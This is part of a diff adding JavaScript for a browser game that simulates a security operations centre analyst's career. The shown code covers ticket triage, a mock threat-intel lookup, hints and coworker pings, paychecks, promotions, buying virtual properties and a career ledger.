+      // 7. WORKDAY GAMEPLAY, TICKET TRIAGE & THREAT INTEL SCANNER
+      // =========================================================================
+      function startNewWorkday() {
+        currentPhaseIndex = 0;
+        todayIncidentBonuses = 0;
+        todayBreachesOccurred = false;
+        hintsRemainingToday = 2;
+        pingsRemainingToday = 2;
+
+        // Apply passive property stress reduction at morning clock-in
+        const reduction = getDailyStressReduction();
+        career.stress = Math.max(5, career.stress - (12 + reduction));
+        saveCareer();
+
+        document.getElementById('shiftSetupPanel').classList.add('hidden');
+        document.getElementById('paycheckModalPanel').classList.add('hidden');
+        document.getElementById('activeWorkdayPanel').classList.remove('hidden');
+
+        // Seed live SOC activity feed
+        const feedEl = document.getElementById('liveSocFeed');
+        feedEl.innerHTML = '';
+        appendSocFeed(`[SHIFT] Day ${currentRotationDay}/${selectedRotationDays} clocked in. Passive stress relief: -${12 + reduction}%.`, 'text-emerald-400');
+        AMBIENT_SOC_LOGS.slice(0, 3).forEach((msg) => appendSocFeed(msg, 'text-slate-400'));
+
+        loadNextTicket();
+      }
+
+      function appendSocFeed(text, colorClass = 'text-slate-300') {
+        const feedEl = document.getElementById('liveSocFeed');
+        const now = SHIFT_PHASES[currentPhaseIndex] ? SHIFT_PHASES[currentPhaseIndex].time : 'LIVE';
+        const line = document.createElement('div');
+        line.className = `${colorClass} leading-snug border-l-2 border-slate-700 pl-2`;
+        line.textContent = `[${now}] ${text}`;
+        feedEl.prepend(line);
+      }
+
+      function updateWorkdayTelemetryHUD() {
+        const role = ROLES[career.roleIndex] || ROLES[0];
+        const phase = SHIFT_PHASES[currentPhaseIndex];
+
+        document.getElementById('workdayCounterText').textContent = `Day ${currentRotationDay} of ${selectedRotationDays}`;
+        document.getElementById('shiftBlockBadge').textContent = phase.time;
+        document.getElementById('shiftPhaseName').textContent = phase.name;
+
+        // Security Score
+        const sec = Math.max(0, Math.min(100, career.securityScore));
+        document.getElementById('securityScoreText').textContent = `${sec}%`;
+        const secBar = document.getElementById('securityScoreBar');
+        secBar.style.width = `${sec}%`;
+        secBar.className = `h-full rounded-full transition-all duration-300 ${
+          sec >= 75 ? 'bg-emerald-500' : sec >= 50 ? 'bg-amber-500' : 'bg-rose-500'
+        }`;
+
+        // Stress Score
+        const str = Math.max(0, Math.min(100, career.stress));
+        document.getElementById('stressScoreText').textContent = `${str}%`;
+        const strBar = document.getElementById('stressScoreBar');
+        strBar.style.width = `${str}%`;
+        strBar.className = `h-full rounded-full transition-all duration-300 ${
+          str < 50 ? 'bg-cyan-500' : str < 80 ? 'bg-amber-500' : 'bg-rose-500'
+        }`;
+
+        // Accrued Pay
+        document.getElementById('todayAccruedPay').textContent = formatMoney(role.dailyPay + todayIncidentBonuses);
+        document.getElementById('todayBonusText').textContent = `Incident Bonuses: +${formatMoney(todayIncidentBonuses)}`;
+
+        // Assist Tokens HUD
+        document.getElementById('assistTokensBadge').textContent = `Hints: ${hintsRemainingToday}/day • Pings: ${pingsRemainingToday}/day`;
+      }
+
+      function resetTicketAssistUI() {
+        hintUsedThisTicket = false;
+        pingedCoworkersThisTicket = [];
+
+        const hintBox = document.getElementById('tacticalHintBox');
+        hintBox.classList.add('hidden');
+        hintBox.textContent = '';
+
+        const hintBtn = document.getElementById('requestHintBtn');
+        hintBtn.disabled = hintsRemainingToday <= 0;
+        hintBtn.className = hintsRemainingToday > 0
+          ? 'px-3 py-1.5 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 border border-amber-500/40 text-amber-300 text-xs font-semibold transition-all flex-shrink-0'
+          : 'px-3 py-1.5 rounded-xl bg-slate-800 border border-slate-700 text-slate-500 text-xs font-semibold cursor-not-allowed flex-shrink-0';
+        hintBtn.textContent = hintsRemainingToday > 0 ? '💡 Request Hint (-5 XP)' : '💡 No Hints Left Today';
+
+        document.querySelectorAll('.ping-coworker-btn').forEach((btn) => {
+          btn.disabled = pingsRemainingToday <= 0;
+          btn.classList.toggle('opacity-50', pingsRemainingToday <= 0);
+          btn.classList.toggle('cursor-not-allowed', pingsRemainingToday <= 0);
+        });
+
+        document.getElementById('slackChatBox').innerHTML =
+          '<span class="text-slate-500 font-mono-code text-[11px]">// #soc-incident-room idle. Click a teammate above to ask for second-opinion triage help.</span>';
+      }
+
+      function handleRequestHint() {
+        if (!currentTicket || ticketResolved || hintUsedThisTicket || hintsRemainingToday <= 0) return;
+
+        hintUsedThisTicket = true;
+        hintsRemainingToday -= 1;
+        career.repXP = Math.max(0, career.repXP - 5);
+        saveCareer();
+        updateWorkdayTelemetryHUD();
+
+        const hintBox = document.getElementById('tacticalHintBox');
+        hintBox.classList.remove('hidden');
+        hintBox.innerHTML = `<strong class="font-mono-code uppercase text-amber-300">[SOC Playbook Hint]:</strong> ${currentTicket.hint}`;
+
+        const hintBtn = document.getElementById('requestHintBtn');
+        hintBtn.disabled = true;
+        hintBtn.className = 'px-3 py-1.5 rounded-xl bg-slate-800 border border-slate-700 text-slate-400 text-xs font-semibold cursor-default flex-shrink-0';
+        hintBtn.textContent = '✓ Playbook Hint Viewed';
+
+        appendSocFeed(`[PLAYBOOK] Consulted triage guide for ${currentTicket.id} (-5 XP).`, 'text-amber-300');
+      }
+
+      function handlePingCoworker(coworkerKey) {
+        if (!currentTicket || ticketResolved) return;
+        if (pingedCoworkersThisTicket.includes(coworkerKey)) return;
+        if (pingsRemainingToday <= 0) return;
+
+        const coworkerMeta = {
+          elena: { name: 'Elena Rostova', role: 'Threat Intel', badgeColor: 'text-cyan-400' },
+          marcus: { name: 'Marcus Thorne', role: 'NetOps Lead', badgeColor: 'text-indigo-400' },
+          priya: { name: 'Priya Nair', role: 'Senior IR Lead', badgeColor: 'text-emerald-400' }
+        };
+
+        const meta = coworkerMeta[coworkerKey];
+        const replyText = (currentTicket.coworkerReplies && currentTicket.coworkerReplies[coworkerKey])
+          || 'Cross-check the raw log timestamps and run all indicators through Threat Intel before taking action.';
+
+        pingedCoworkersThisTicket.push(coworkerKey);
+        pingsRemainingToday -= 1;
+        career.repXP = Math.max(0, career.repXP - 10);
+        saveCareer();
+        updateWorkdayTelemetryHUD();
+
+        // Update coworker button states
+        document.querySelectorAll('.ping-coworker-btn').forEach((btn) => {
+          const key = btn.dataset.coworker;
+          const alreadyPinged = pingedCoworkersThisTicket.includes(key);
+          if (alreadyPinged || pingsRemainingToday <= 0) {
+            btn.disabled = true;
+            btn.classList.add('opacity-50', 'cursor-not-allowed');
+          }
+        });
+
+        const slackBox = document.getElementById('slackChatBox');
+        if (pingedCoworkersThisTicket.length === 1) {
+          slackBox.innerHTML = '';
+        }
+
+        const msgDiv = document.createElement('div');
+        msgDiv.className = 'p-2.5 rounded-lg bg-slate-900 border border-slate-800 space-y-1';
+        msgDiv.innerHTML = `
+          <div class="flex items-center justify-between text-[11px] font-mono-code">
+            <span class="font-bold ${meta.badgeColor}">@${meta.name} <span class="text-slate-500 font-normal">(${meta.role})</span></span>
+            <span class="text-slate-500">just now</span>
+          </div>
+          <p class="text-slate-200 leading-relaxed">"${replyText}"</p>
+        `;
+        slackBox.appendChild(msgDiv);
+
+        appendSocFeed(`[SLACK] Pinged ${meta.name} (${meta.role}) on ${currentTicket.id} (-10 XP).`, 'text-cyan-300');
+      }
+
+      document.getElementById('requestHintBtn').addEventListener('click', handleRequestHint);
+      document.querySelectorAll('.ping-coworker-btn').forEach((btn) => {
+        btn.addEventListener('click', () => handlePingCoworker(btn.dataset.coworker));
+      });
+
+      function loadNextTicket() {
+        ticketResolved = false;
+        resetTicketAssistUI();
+        document.getElementById('ticketOutcomeBox').classList.add('hidden');
+        document.getElementById('iocSearchInput').value = '';
+        document.getElementById('iocResultBox').innerHTML =
+          '<span class="text-slate-500">// Ready. Enter or click an indicator above to query threat intelligence feeds...</span>';
+
+        // Pick a scenario not recently used
+        let pool = SCENARIOS.filter((s) => !usedScenarioIds.includes(s.id));
+        if (pool.length === 0) {
+          usedScenarioIds = [];
+          pool = [...SCENARIOS];
+        }
+        currentTicket = pool[Math.floor(Math.random() * pool.length)];
+        usedScenarioIds.push(currentTicket.id);
+
+        updateWorkdayTelemetryHUD();
+
+        // Populate Ticket UI
+        const sevBadge = document.getElementById('ticketSeverityBadge');
+        sevBadge.textContent = `${currentTicket.severity} SEVERITY`;
+        if (currentTicket.sevColor === 'rose') {
+          sevBadge.className = 'px-2.5 py-0.5 rounded-md text-[11px] font-mono-code font-bold uppercase bg-rose-500/20 text-rose-400 border border-rose-500/30';
+        } else if (currentTicket.sevColor === 'amber') {
+          sevBadge.className = 'px-2.5 py-0.5 rounded-md text-[11px] font-mono-code font-bold uppercase bg-amber-500/20 text-amber-400 border border-amber-500/30';
+        } else {
+          sevBadge.className = 'px-2.5 py-0.5 rounded-md text-[11px] font-mono-code font-bold uppercase bg-cyan-500/20 text-cyan-400 border border-cyan-500/30';
+        }
+
+        document.getElementById('ticketIdText').textContent = currentTicket.id;
+        document.getElementById('ticketCategoryTag').textContent = currentTicket.category;
+        document.getElementById('ticketTitle').textContent = currentTicket.title;
+        document.getElementById('ticketDescription').textContent = currentTicket.description;
+        document.getElementById('ticketRawLog').textContent = currentTicket.rawLog;
+
+        // Populate Quick IOC Chips for Threat Intel Scanner
+        const chipsContainer = document.getElementById('quickIocChips');
+        chipsContainer.innerHTML = '';
+        Object.keys(currentTicket.iocs).forEach((iocKey) => {
+          const chip = document.createElement('button');
+          chip.type = 'button';
+          chip.className = 'px-2 py-1 rounded-md bg-slate-800 hover:bg-cyan-950 border border-slate-700 hover:border-cyan-500/50 text-[11px] font-mono-code text-cyan-300 transition-colors';
+          chip.textContent = `🔍 ${iocKey}`;
+          chip.addEventListener('click', () => runThreatIntelScan(iocKey));
+          chipsContainer.appendChild(chip);
+        });
+
+        // Render Response Options (Shuffled)
+        const actionsContainer = document.getElementById('ticketActionsContainer');
+        actionsContainer.innerHTML = '';
+        const shuffledChoices = [...currentTicket.choices].sort(() => Math.random() - 0.5);
+
+        shuffledChoices.forEach((choice, idx) => {
+          const btn = document.createElement('button');
+          btn.type = 'button';
+          btn.className = 'ticket-choice-btn w-full text-left p-3.5 rounded-xl bg-slate-950/90 hover:bg-slate-800/90 border border-slate-800 hover:border-emerald-500/50 transition-all flex items-start gap-3 text-xs sm:text-sm font-medium text-slate-200';
+          btn.innerHTML = `
+            <span class="w-6 h-6 rounded-lg bg-slate-900 border border-slate-700 flex items-center justify-center font-mono-code text-xs font-bold text-slate-400 flex-shrink-0 mt-0.5">
+              ${idx + 1}
+            </span>
+            <span class="leading-snug">${choice.text}</span>
+          `;
+          btn.addEventListener('click', () => resolveTicketChoice(choice, btn));
+          actionsContainer.appendChild(btn);
+        });
+
+        appendSocFeed(`New Ticket ${currentTicket.id}: ${currentTicket.title}`, 'text-amber-300');
+      }
+
+      function runThreatIntelScan(queryRaw) {
+        const query = queryRaw.trim();
+        if (!query) return;
+        document.getElementById('iocSearchInput').value = query;
+        const resultBox = document.getElementById('iocResultBox');
+
+        // Match against current ticket's IOC dictionary
+        const matchedKey = Object.keys(currentTicket.iocs).find(
+          (k) => k.toLowerCase() === query.toLowerCase() || k.toLowerCase().includes(query.toLowerCase())
+        );
+
+        if (matchedKey) {
+          const verdict = currentTicket.iocs[matchedKey];
+          const isBad = verdict.startsWith('MALICIOUS') || verdict.startsWith('CRITICAL');
+          const color = isBad ? 'text-rose-400' : 'text-emerald-400';
+          resultBox.innerHTML = `
+            <div class="text-[10px] text-slate-500 mb-1">IOC QUERY: ${matchedKey}</div>
+            <div class="${color} font-semibold leading-relaxed">${verdict}</div>
+          `;
+          appendSocFeed(`OSINT lookup executed on "${matchedKey}".`, 'text-cyan-400');
+        } else {
+          resultBox.innerHTML = `
+            <div class="text-[10px] text-slate-500 mb-1">IOC QUERY: ${query}</div>
+            <div class="text-slate-400">No direct threat intel hit in local feed. Try scanning one of the highlighted indicators from the log above.</div>
+          `;
+        }
+      }
+
+      document.getElementById('iocSearchBtn').addEventListener('click', () => {
+        runThreatIntelScan(document.getElementById('iocSearchInput').value);
+      });
+
+      document.getElementById('iocSearchInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') runThreatIntelScan(e.target.value);
+      });
+
+      function resolveTicketChoice(choice, clickedBtn) {
+        if (ticketResolved) return;
+        ticketResolved = true;
+
+        // Disable all choice buttons and highlight selected
+        const allBtns = document.querySelectorAll('.ticket-choice-btn');
+        allBtns.forEach((b) => {
+          b.disabled = true;
+          if (b === clickedBtn) {
+            b.className = choice.isCorrect
+              ? 'ticket-choice-btn w-full text-left p-3.5 rounded-xl bg-emerald-950/50 border-2 border-emerald-500 flex items-start gap-3 text-xs sm:text-sm font-semibold text-emerald-200'
+              : 'ticket-choice-btn w-full text-left p-3.5 rounded-xl bg-rose-950/50 border-2 border-rose-500 flex items-start gap-3 text-xs sm:text-sm font-semibold text-rose-200';
+          } else {
+            b.classList.add('opacity-45');
+          }
+        });
+
+        // Calculate Metrics & Bonuses
+        const roleBoost = career.roleIndex * 25;
+        const assetBoost = getTicketBonusBoost();
+        const earnedBonus = choice.isCorrect ? (choice.payBonus + roleBoost + assetBoost) : 0;
+
+        career.securityScore = Math.max(0, Math.min(100, career.securityScore + choice.secDelta));
+        career.stress = Math.max(0, Math.min(100, career.stress + choice.stressDelta));
+        career.repXP = Math.max(0, career.repXP + choice.repDelta);
+
+        if (choice.isCorrect) {
+          career.ticketsResolved += 1;
+          todayIncidentBonuses += earnedBonus;
+          appendSocFeed(`[RESOLVED] ${currentTicket.id} mitigated cleanly (+${formatMoney(earnedBonus)} bonus).`, 'text-emerald-400');
+        } else {
+          todayBreachesOccurred = true;
+          appendSocFeed(`[INCIDENT ESCALATED] Improper response on ${currentTicket.id}! Security posture impacted.`, 'text-rose-400');
+        }
+
+        // Add ambient log line
+        const ambient = AMBIENT_SOC_LOGS[Math.floor(Math.random() * AMBIENT_SOC_LOGS.length)];
+        appendSocFeed(ambient, 'text-slate-400');
+
+        saveCareer();
+        updateHUD();
+        updateWorkdayTelemetryHUD();
+
+        // Populate Outcome Box
+        const outcomeBox = document.getElementById('ticketOutcomeBox');
+        const outcomeIcon = document.getElementById('outcomeIcon');
+        const outcomeTitle = document.getElementById('outcomeTitle');
+        const outcomeExplanation = document.getElementById('outcomeExplanation');
+        const outcomeDeltas = document.getElementById('outcomeDeltas');
+
+        outcomeBox.classList.remove('hidden');
+        if (choice.isCorrect) {
+          outcomeBox.className = 'mt-5 rounded-xl border border-emerald-500/40 bg-emerald-950/30 p-4';
+          outcomeIcon.className = 'w-7 h-7 rounded-lg flex items-center justify-center font-bold text-sm flex-shrink-0 bg-emerald-500 text-slate-950';
+          outcomeIcon.textContent = '✓';
+          outcomeTitle.className = 'font-bold text-sm text-emerald-300';
+          outcomeTitle.textContent = 'Optimal Tactical Response';
+        } else {
+          outcomeBox.className = 'mt-5 rounded-xl border border-rose-500/40 bg-rose-950/30 p-4';
+          outcomeIcon.className = 'w-7 h-7 rounded-lg flex items-center justify-center font-bold text-sm flex-shrink-0 bg-rose-500 text-white';
+          outcomeIcon.textContent = '!';
+          outcomeTitle.className = 'font-bold text-sm text-rose-300';
+          outcomeTitle.textContent = 'Suboptimal Response — Post-Incident Review';
+        }
+
+        outcomeExplanation.textContent = choice.explanation;
+        outcomeDeltas.innerHTML = `
+          <span class="px-2 py-0.5 rounded bg-slate-900 ${choice.secDelta >= 0 ? 'text-emerald-400' : 'text-rose-400'}">
+            Security: ${choice.secDelta >= 0 ? '+' : ''}${choice.secDelta}%
+          </span>
+          <span class="px-2 py-0.5 rounded bg-slate-900 ${choice.repDelta >= 0 ? 'text-cyan-400' : 'text-rose-400'}">
+            Rep XP: ${choice.repDelta >= 0 ? '+' : ''}${choice.repDelta}
+          </span>
+          <span class="px-2 py-0.5 rounded bg-slate-900 text-amber-400">
+            Stress: +${choice.stressDelta}%
+          </span>
+          ${earnedBonus > 0 ? `<span class="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300">Bonus: +${formatMoney(earnedBonus)}</span>` : ''}
+        `;
+
+        // Update Advance Shift Button Label
+        const isLastPhaseOfDay = currentPhaseIndex >= SHIFT_PHASES.length - 1;
+        document.getElementById('advanceShiftBtnText').textContent = isLastPhaseOfDay
+          ? 'Clock Out & Collect Daily Paycheck'
+          : 'Next Shift Block →';
+      }
+
+      document.getElementById('advanceShiftBtn').addEventListener('click', () => {
+        if (currentPhaseIndex < SHIFT_PHASES.length - 1) {
+          currentPhaseIndex += 1;
+          loadNextTicket();
+        } else {
+          completeWorkdayAndShowPaycheck();
+        }
+      });
+
+      // Coffee / Espresso Stress Relief Action
+      document.getElementById('drinkCoffeeBtn').addEventListener('click', () => {
+        if (career.bank < 12) {
+          appendSocFeed('[ALERT] Insufficient funds ($12) for double espresso!', 'text-rose-400');
+          return;
+        }
+        if (career.stress <= 0) return;
+        career.bank -= 12;
+        career.stress = Math.max(0, career.stress - 15);
+        saveCareer();
+        updateHUD();
+        updateWorkdayTelemetryHUD();
+        appendSocFeed('[BREAK] Grabbed double espresso (-$12). Burnout stress reduced by 15%.', 'text-cyan-400');
+      });
+
+      // =========================================================================
+      // 8. END-OF-DAY PAYCHECK & PROMOTION ENGINE
+      // =========================================================================
+      function completeWorkdayAndShowPaycheck() {
+        const role = ROLES[career.roleIndex] || ROLES[0];
+        const rotationObj = ROTATION_OPTIONS.find((r) => r.days === selectedRotationDays) || ROTATION_OPTIONS[0];
+        const isRotationFinalDay = currentRotationDay >= selectedRotationDays;
+
+        const basePay = role.dailyPay;
+        const slaBonus = (!todayBreachesOccurred && career.securityScore >= 60) ? 100 : 0;
+        const passiveIncome = getPassiveDailyIncome();
+        const rotationBonus = isRotationFinalDay ? rotationObj.bonus : 0;
+        const expenses = role.livingCost;
+
+        const netPayout = basePay + todayIncidentBonuses + slaBonus + passiveIncome + rotationBonus - expenses;
+
+        career.bank += netPayout;
+        if (netPayout > 0) career.lifetimeEarnings += netPayout;
+        career.totalDaysWorked += 1;
+
+        // Check for Career Promotion
+        let promotedToRole = null;
+        if (career.roleIndex < ROLES.length - 1) {
+          const nextRole = ROLES[career.roleIndex + 1];
+          if (career.repXP >= nextRole.minRep) {
+            career.roleIndex += 1;
+            promotedToRole = nextRole;
+          }
+        }
+
+        // Record in Pay History Ledger
+        career.payHistory.unshift({
+          dayNumber: career.totalDaysWorked,
+          roleTitle: role.title,
+          netPayout,
+          basePay,
+          bonuses: todayIncidentBonuses + slaBonus + rotationBonus,
+          passive: passiveIncome,
+          isRotationEnd: isRotationFinalDay
+        });
+        if (career.payHistory.length > 30) career.payHistory.pop();
+
+        saveCareer();
+        updateHUD();
+
+        // Render Paycheck Statement UI
+        document.getElementById('activeWorkdayPanel').classList.add('hidden');
+        document.getElementById('paycheckModalPanel').classList.remove('hidden');
+
+        document.getElementById('paycheckHeaderTag').textContent = isRotationFinalDay
+          ? `ROTATION COMPLETE (${selectedRotationDays}-DAY BLOCK)`
+          : `DAILY SHIFT STATEMENT • DAY ${currentRotationDay} OF ${selectedRotationDays}`;
+        document.getElementById('paycheckTitle').textContent = isRotationFinalDay
+          ? 'Rotation Complete — Paycheck Deposited!'
+          : `Shift Day ${currentRotationDay} Complete`;
+
+        document.getElementById('stubRoleLabel').textContent = role.title;
+        document.getElementById('stubBasePay').textContent = `+${formatMoney(basePay)}`;
+        document.getElementById('stubIncidentBonus').textContent = `+${formatMoney(todayIncidentBonuses)}`;
+        document.getElementById('stubSlaBonus').textContent = `+${formatMoney(slaBonus)}`;
+        document.getElementById('stubPassiveIncome').textContent = `+${formatMoney(passiveIncome)}`;
+        document.getElementById('stubExpenses').textContent = `-${formatMoney(expenses)}`;
+        document.getElementById('stubNetTotal').textContent = `+${formatMoney(netPayout)}`;
+
+        const rotRow = document.getElementById('stubRotationBonusRow');
+        if (isRotationFinalDay) {
+          rotRow.classList.remove('hidden');
+          document.getElementById('stubRotationBonus').textContent = `+${formatMoney(rotationBonus)}`;
+        } else {
+          rotRow.classList.add('hidden');
+        }
+
+        // Promotion Banner
+        const promoBanner = document.getElementById('promotionBanner');
+        if (promotedToRole) {
+          promoBanner.classList.remove('hidden');
+          document.getElementById('promotionText').textContent =
+            `You've been promoted to ${promotedToRole.title}! Your new base salary is ${formatMoney(promotedToRole.dailyPay)}/day.`;
+        } else {
+          promoBanner.classList.add('hidden');
+        }
+
+        // Next Action Button
+        const nextBtn = document.getElementById('paycheckNextActionBtn');
+        if (isRotationFinalDay) {
+          inActiveRotation = false;
+          nextBtn.textContent = 'Schedule Next Work Rotation →';
+        } else {
+          nextBtn.textContent = `Clock In for Day ${currentRotationDay + 1} of ${selectedRotationDays} →`;
+        }
+      }
+
+      document.getElementById('paycheckNextActionBtn').addEventListener('click', () => {
+        if (inActiveRotation && currentRotationDay < selectedRotationDays) {
+          currentRotationDay += 1;
+          startNewWorkday();
+        } else {
+          inActiveRotation = false;
+          document.getElementById('paycheckModalPanel').classList.add('hidden');
+          document.getElementById('shiftSetupPanel').classList.remove('hidden');
+          renderShiftSetup();
+        }
+      });
+
+      document.getElementById('paycheckGoMarketBtn').addEventListener('click', () => {
+        switchView('realestate');
+      });
+
+      // =========================================================================
+      // 9. REAL ESTATE & TECH ASSETS MARKETPLACE
+      // =========================================================================
+      function showPropertyToast(msg, isSuccess = true) {
+        const toast = document.getElementById('propertyToast');
+        toast.textContent = msg;
+        toast.className = isSuccess
+          ? 'rounded-xl p-3.5 text-xs sm:text-sm font-semibold border border-emerald-500/40 bg-emerald-950/50 text-emerald-300'
+          : 'rounded-xl p-3.5 text-xs sm:text-sm font-semibold border border-rose-500/40 bg-rose-950/50 text-rose-300';
+        toast.classList.remove('hidden');
+        setTimeout(() => toast.classList.add('hidden'), 4000);
+      }
+
+      function renderRealEstateMarket() {
+        document.getElementById('reCashDisplay').textContent = formatMoney(career.bank);
+        document.getElementById('rePassiveDisplay').textContent = `+${formatMoney(getPassiveDailyIncome())} / day`;
+
+        const grid = document.getElementById('propertiesGrid');
+        grid.innerHTML = '';
+
+        PROPERTIES.forEach((prop) => {
+          const isOwned = career.ownedProperties.includes(prop.id);
+          const canAfford = career.bank >= prop.price;
+
+          const card = document.createElement('div');
+          card.className = `bg-slate-900/90 border rounded-2xl overflow-hidden flex flex-col justify-between transition-all ${
+            isOwned ? 'border-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.1)]' : 'border-slate-800'
+          }`;
+
+          // Custom inline SVG architectural/infrastructure illustration
+          const svgIllustration = `
+            <div class="h-32 bg-slate-950 border-b border-slate-800/80 relative flex items-center justify-center overflow-hidden">
+              <svg class="w-full h-full opacity-85" viewBox="0 0 300 120" fill="none">
+                <defs>
+                  <linearGradient id="grad-${prop.id}" x1="0" y1="0" x2="0" y2="1">
+                    <stop offset="0%" stop-color="${prop.accent}" stop-opacity="0.35" />
+                    <stop offset="100%" stop-color="#020617" stop-opacity="0.95" />
+                  </linearGradient>
+                </defs>
+                <rect width="300" height="120" fill="url(#grad-${prop.id})" />
+                <path d="M0 98 H300" stroke="${prop.accent}" stroke-opacity="0.3" stroke-width="1" />
+                <rect x="75" y="34" width="65" height="64" rx="4" fill="#0f172a" stroke="${prop.accent}" stroke-width="1.5" />
+                <rect x="150" y="20" width="75" height="78" rx="4" fill="#0f172a" stroke="${prop.accent}" stroke-width="1.5" />
+                <rect x="90" y="48" width="12" height="12" fill="${prop.accent}" fill-opacity="0.6" />
+                <rect x="112" y="48" width="12" height="12" fill="${prop.accent}" fill-opacity="0.3" />
+                <rect x="90" y="68" width="12" height="12" fill="${prop.accent}" fill-opacity="0.3" />
+                <rect x="165" y="34" width="14" height="10" fill="${prop.accent}" fill-opacity="0.7" />
+                <rect x="190" y="34" width="14" height="10" fill="${prop.accent}" fill-opacity="0.4" />
+                <rect x="165" y="52" width="14" height="10" fill="${prop.accent}" fill-opacity="0.4" />
+                <rect x="190" y="52" width="14" height="10" fill="${prop.accent}" fill-opacity="0.7" />
+              </svg>
+              <span class="absolute top-3 left-3 px-2.5 py-0.5 rounded-md text-[10px] font-mono-code font-bold uppercase bg-slate-900/90 border border-slate-700 text-slate-300">
+                ${prop.category}
+              </span>
+              ${isOwned ? '<span class="absolute top-3 right-3 px-2.5 py-0.5 rounded-md text-[10px] font-mono-code font-bold uppercase bg-emerald-500 text-slate-950">OWNED</span>' : ''}
+            </div>
+          `;
+
+          card.innerHTML = `
+            <div>
+              ${svgIllustration}
+              <div class="p-5">
+                <h3 class="font-bold text-base text-white">${prop.name}</h3>
+                <p class="text-xs text-slate-400 mt-1.5 leading-relaxed">${prop.desc}</p>
+
+                <div class="mt-4 space-y-2 pt-3 border-t border-slate-800/80 text-xs font-mono-code">
+                  <div class="flex justify-between">
+                    <span class="text-slate-400">Passive Yield:</span>
+                    <span class="text-emerald-400 font-bold">+${formatMoney(prop.dailyIncome)} / day</span>
+                  </div>
+                  <div class="flex justify-between">
+                    <span class="text-slate-400">Career Perk:</span>
+                    <span class="text-cyan-300 font-semibold">${prop.perkText}</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="px-5 pb-5">
+              <button
+                data-buy-id="${prop.id}"
+                ${isOwned || !canAfford ? 'disabled' : ''}
+                class="buy-prop-btn w-full py-2.5 px-4 rounded-xl font-bold text-xs sm:text-sm transition-all ${
+                  isOwned
+                    ? 'bg-emerald-500/15 border border-emerald-500/40 text-emerald-400 cursor-default'
+                    : canAfford
+                    ? 'bg-emerald-500 hover:bg-emerald-400 text-slate-950 shadow-md shadow-emerald-500/20'
+                    : 'bg-slate-800 text-slate-500 cursor-not-allowed'
+                }"
+              >
+                ${isOwned ? '✓ Asset Active in Portfolio' : `Purchase for ${formatMoney(prop.price)}`}
+              </button>
+            </div>
+          `;
+
+          grid.appendChild(card);
+        });
+
+        // Attach purchase handlers
+        grid.querySelectorAll('.buy-prop-btn').forEach((btn) => {
+          btn.addEventListener('click', () => {
+            const propId = btn.dataset.buyId;
+            const prop = PROPERTIES.find((p) => p.id === propId);
+            if (!prop || career.ownedProperties.includes(propId)) return;
+
+            if (career.bank < prop.price) {
+              showPropertyToast(`Insufficient funds! You need ${formatMoney(prop.price - career.bank)} more.`, false);
+              return;
+            }
+
+            career.bank -= prop.price;
+            career.ownedProperties.push(prop.id);
+            saveCareer();
+            updateHUD();
+            renderRealEstateMarket();
+            showPropertyToast(`Acquired ${prop.name}! Earning +${formatMoney(prop.dailyIncome)}/day passive income.`, true);
+          });
+        });
+      }
+
+      // =========================================================================
+      // 10. CAREER LEDGER & SAVE RESET
+      // =========================================================================
+      function renderCareerLedger() {
+        const propertyEquity = career.ownedProperties.reduce((sum, id) => {
+          const p = PROPERTIES.find((x) => x.id === id);
+          return sum + (p ? p.price : 0);
+        }, 0);
+
+        document.getElementById('statDaysWorked').textContent = career.totalDaysWorked;
+        document.getElementById('statTicketsResolved').textContent = career.ticketsResolved;
+        document.getElementById('statLifetimeEarnings').textContent = formatMoney(career.lifetimeEarnings);
+        document.getElementById('statNetWorth').textContent = formatMoney(career.bank + propertyEquity);
+
+        const listEl = document.getElementById('payHistoryList');
+        listEl.innerHTML = '';
+
+        if (career.payHistory.length === 0) {
+          listEl.innerHTML = `
+            <div class="p-4 rounded-xl bg-slate-950 border border-slate-800 text-xs sm:text-sm text-slate-400">
+              No completed shifts yet. Clock in at the SOC Workstation to earn your first direct deposit!
+            </div>
+          `;
+          return;
+        }
+
+        career.payHistory.forEach((entry) => {
+          const row = document.createElement('div');
+          row.className = 'p-3.5 rounded-xl bg-slate-950 border border-slate-800 flex flex-wrap items-center justify-between gap-2 font-mono-code text-xs';
+          row.innerHTML = `
+            <div>
+              <span class="text-white font-bold">Career Day #${entry.dayNumber}</span>
+              <span class="text-slate-400 ml-2">• ${entry.roleTitle}</span>
+              ${entry.isRotationEnd ? '<span class="ml-2 px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 text-[10px]">ROTATION BONUS</span>' : ''}
+            </div>
+            <div class="flex items-center gap-4">
+              <span class="text-slate-400 hidden sm:inline">Base: ${formatMoney(entry.basePay)} | Bonuses: +${formatMoney(entry.bonuses)} | Passive: +${formatMoney(entry.passive)}</span>
+              <span class="text-emerald-400 font-bold text-sm">+${formatMoney(entry.netPayout)}</span>
+            </div>
+          `;
+          listEl.appendChild(row);
+        });
+      }
+
+      document.getElementById('resetCareerBtn').addEventListener('click', () => {
+        document.getElementById('careerResetConfirm').classList.remove('hidden');
+      });
+
+      document.getElementById('cancelWipeBtn').addEventListener('click', () => {
+        document.getElementById('careerResetConfirm').classList.add('hidden');
+      });
+
+      document.getElementById('confirmWipeBtn').addEventListener('click', () => {
+        career = getDefaultCareer();
+        saveCareer();
+        inActiveRotation = false;
+        document.getElementById('careerResetConfirm').classList.add('hidden');
+        document.getElementById('activeWorkdayPanel').classList.add('hidden');
+        document.getElementById('paycheckModalPanel').classList.add('hidden');
+        document.getElementById('shiftSetupPanel').classList.remove('hidden');
+        updateHUD();
+        renderCareerLedger();
+        renderShiftSetup();
+      });
+
+      // =========================================================================
+      // 11. BOOT APPLICATION
+      // =========================================================================
+      updateHUD();
+      renderShiftSetup();
+    })();
+  </script>
+</body>
+</html>
